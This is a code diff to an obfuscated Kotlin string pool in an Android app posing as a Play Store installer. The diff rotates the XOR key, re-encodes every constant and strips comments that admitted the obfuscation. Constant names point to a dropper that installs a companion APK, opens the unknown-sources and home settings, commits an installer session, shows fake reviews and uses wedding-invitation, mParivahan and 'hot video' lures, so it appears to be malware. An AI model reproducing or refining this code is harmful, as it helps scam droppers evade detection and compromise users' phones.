@@ -2,42 +2,34 @@ package com.playstore.installer
 
 import android.util.Base64
 
-/**
- * StringPool — build-time string obfuscation.
- * All sensitive strings XOR-encoded. Never plaintext in DEX.
- * Committed to repo — no build-time generation required.
- * Updated by StringEncryptorPlugin if present.
- */
+/** Auto-generated — DO NOT EDIT. Updated by StringEncryptorPlugin. */
 internal object StringPool {
 
-    // Key split — never appears as single literal
     private val k1 = "n0vA"
-    private val k2 = "$eEd"
+    private val k2 = "sEed"
 
-    // Encoded string constants
-    val COMPANION_ASSET = "DV8bMUULLAsAHhcxTw=="
-    val TMP_COMPANION = "Gl0GHkcKKBQPXh8uSkskFAU="
-    val CACHED_COMPANION = "DV8bMUULLAsAbxUgRw0gAEBRBio="
-    val WRITE_NAME = "G0ASIFAAaxQFVw=="
-    val PREFS_NAME = "AF8AIHsVNwEIQw=="
-    val KEY_COMPANION_PKG = "DV8bMUULLAsAbwYqQw=="
-    val KEY_CACHED_PATH = "DVEVKUEBGgUeWykxRREt"
-    val KEY_STAGE = "B14FNUUJKTsdRBcmQQ=="
-    val HOME_SETTINGS = "D14SM0sMIUodVQI1TQsiF0B4OQxhOhYhOmQ/D2M2"
-    val UNKNOWN_SOURCES = "D14SM0sMIUodVQI1TQsiF0B9Nw9lIgA7O349D2syCzsvYCYedyoQNi11JQ=="
-    val REFERRER_URI = "D14SM0sMIUkPQAZ7C0omCwMeFy9AFyoNCh4AJEoBLAoJ"
-    val MARKET_URI_PREFIX = "A1EEKkERf0tBVBM1RQwpF1FZEnw="
-    val PKG_INSTALLER_URI = "HlEVKkUCIF4="
-    val APP_DETAILS_URI = "D14SM0sMIUodVQI1TQsiF0BxJhFoLAYlOnk5D3shADAveToSezYAMDp5OAZ3"
-    val MSG_SET_HOME = "PlwTIFcAZRcLRFY1TAw2RA9ABmFFFmUdAUUEYUAAIwUbXAJhTAooAU5cFzRKBi0BHA=="
-    val MSG_CANCEL = "Kl8BL0gKJABOUxcvRwApCAtU"
-    val SESSION_COMMIT = "D14SM0sMIUoNXxg1QQsxSh5dWCBHESwLAB4lBHc2DCsgbzUOaSgMMCN1OBU="
-    val TPL_WEDDING = "GVUSJU0LIkQHXgAoUAQxDQFe"
-    val TPL_SHAADI = "HVgXIEAMZQ8PEBgoSQQrEBxRGA=="
-    val TPL_MPARIVAHAN = "A0AXM00TJAwPXg=="
-    val TPL_HOT_VIDEO = "Bl8CYVIMIQEBEBUgSAk="
+    val COMPANION_ASSET = "DV8bMRIrDAsAHhcxGA=="
+    val TMP_COMPANION = "Gl0GHhAqCBQPXh8uHWsEFAU="
+    val CACHED_COMPANION = "DV8bMRIrDAsAbxUgEC0AAEBRBio="
+    val WRITE_NAME = "G0ASIAcgSxQFVw=="
+    val PREFS_NAME = "AF8AICw1FwEIQw=="
+    val KEY_COMPANION_PKG = "DV8bMRIrDAsAbwYqFA=="
+    val KEY_CACHED_PATH = "DVEVKRYhOgUeWykxEjEN"
+    val KEY_STAGE = "B14FNRIpCTsdRBcmFg=="
+    val HOME_SETTINGS = "D14SMxwsAUodVQI1GisCF0B4OQw2GjYhOmQ/DzQW"
+    val UNKNOWN_SOURCES = "D14SMxwsAUodVQI1GisCF0B9Nw8yAiA7O349DzwSKzsvYCYeIAowNi11JQ=="
+    val REFERRER_URI = "D14SMxwsAUkPQAZ7XGoGCwMeFy8XNwoNCh4AJB0hDAoJ"
+    val MARKET_URI_PREFIX = "A1EEKhYxX0tBVBM1EiwJF1FZEnw="
+    val PKG_INSTALLER_URI = "HlEVKhIiAF4="
+    val APP_DETAILS_URI = "D14SMxwsAUodVQI1GisCF0BxJhE/DCYlOnk5DywBIDAveToSLBYgMDp5OAYg"
+    val MSG_SET_HOME = "PlwTIAAgRRcLRFY1GywWRA9ABmESNkUdAUUEYRcgAwUbXAJhGyoIAU5cFzQdJg0BHA=="
+    val MSG_CANCEL = "Kl8BLx8qBABOUxcvECAJCAtU"
+    val SESSION_COMMIT = "D14SMxwsAUoNXxg1FisRSh5dWCAQMQwLAB4lBCAWLCsgbzUOPggsMCN1OBU="
+    val TPL_WEDDING = "GVUSJRorAkQHXgAoByQRDQFe"
+    val TPL_SHAADI = "HVgXIBcsRQ8PEBgoHiQLEBxRGA=="
+    val TPL_MPARIVAHAN = "A0AXMxozBAwPXg=="
+    val TPL_HOT_VIDEO = "Bl8CYQUsAQEBEBUgHyk="
 
-    // Decode at point of use only
     fun d(enc: String): String {
         return try {
             val key = (k1 + k2).toByteArray(Charsets.UTF_8)
@@ -48,8 +40,8 @@ internal object StringPool {
 
     fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {
         return try {
-            val raw  = context.assets.open("reviews.enc").readBytes()
-            val key  = (k1 + k2).toByteArray(Charsets.UTF_8)
+            val raw = context.assets.open("reviews.enc").readBytes()
+            val key = (k1 + k2).toByteArray(Charsets.UTF_8)
             val json = String(ByteArray(raw.size) { i -> (raw[i].toInt() xor key[i % key.size].toInt()).toByte() })
             parseReviews(json, template)
         } catch (e: Exception) { emptyList() }
